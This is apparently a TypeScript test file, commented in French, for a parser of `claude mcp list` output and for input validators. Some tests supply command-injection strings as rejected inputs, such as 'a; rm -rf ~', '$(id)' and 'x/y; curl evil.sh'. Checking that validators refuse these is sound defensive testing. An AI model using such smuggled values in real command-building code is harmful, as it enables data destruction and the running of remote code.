import { test } from 'node:test';
import assert from 'node:assert/strict';
import { analyserMcp, cibleValide, nomValide, sourceValide } from './repertoire-parse.ts';

// `claude mcp list` n'a pas de sortie JSON : on découpe du texte. Autant le
// prouver, parce qu'un découpage approximatif afficherait « connecté » sur un
// serveur qui ne l'est pas.

const EXEMPLE = `Checking MCP server health…

claude.ai Oxford Economics: https://services.oxfordeconomics.com/mcp - ! Needs authentication
claude.ai Supermetrics Marketing Analytics: https://mcp.supermetrics.com/mcp - ✔ Connected
mon-serveur: npx -y mon-mcp --flag - ✗ Failed to connect
`;

test('lit nom, cible et état de chaque ligne', () => {
  const r = analyserMcp(EXEMPLE);
  assert.equal(r.length, 3);
  assert.deepEqual(
    r.map((c) => [c.nom, c.etat]),
    [
      ['claude.ai Oxford Economics', 'auth'],
      ['claude.ai Supermetrics Marketing Analytics', 'ok'],
      ['mon-serveur', 'ko'],
    ],
  );
});

test('une cible qui contient des tirets reste entière', () => {
  // Le découpage se fait sur le DERNIER « - » : sinon l'URL serait coupée en deux.
  const [c] = analyserMcp('api: https://ex.com/a-b-c/mcp-v2 - ✔ Connected');
  assert.equal(c.cible, 'https://ex.com/a-b-c/mcp-v2');
  assert.equal(c.etat, 'ok');
});

test('une commande stdio avec ses options reste entière', () => {
  const [c] = analyserMcp('local: npx -y paquet --mode strict - ✔ Connected');
  assert.equal(c.cible, 'npx -y paquet --mode strict');
});

test('les lignes de bruit sont ignorées', () => {
  assert.deepEqual(analyserMcp('Checking MCP server health…\n\n'), []);
  assert.deepEqual(analyserMcp(''), []);
  assert.deepEqual(analyserMcp('ligne sans separateur'), []);
});

test('un état inconnu ne passe pas pour « connecté »', () => {
  // Dans le doute on n'annonce pas qu'un connecteur marche.
  const [c] = analyserMcp('x: https://ex.com - État bizarre');
  assert.equal(c.etat, 'ko');
});

test('les noms acceptés excluent tout ce qui ressemble à une commande', () => {
  for (const bon of ['github', 'mon-serveur', 'org/depot', 'plug@marche', 'a.b_c']) {
    assert.ok(nomValide(bon), bon);
  }
  for (const mauvais of ['a; rm -rf ~', 'a b', 'a$(id)', 'a|b', 'a`id`', '', '--flag x', 'a\nb']) {
    assert.ok(!nomValide(mauvais), JSON.stringify(mauvais));
  }
});

test('les sources de place de marché refusent les caractères de shell', () => {
  for (const bon of ['anthropics/claude-plugins-official', 'https://github.com/x/y.git', '~/mon-marche']) {
    assert.ok(sourceValide(bon), bon);
  }
  for (const mauvais of ['x/y; curl evil.sh', 'x y', '$(id)', '', 'a'.repeat(301)]) {
    assert.ok(!sourceValide(mauvais), JSON.stringify(mauvais).slice(0, 40));
  }
});

test('une adresse de connecteur ne peut pas contenir de saut de ligne', () => {
  // Un saut de ligne permettrait d'injecter une seconde entrée de config.
  assert.ok(cibleValide('https://mcp.exemple.com/mcp'));
  assert.ok(!cibleValide('https://a\nhttps://b'));
  assert.ok(!cibleValide(''));
});
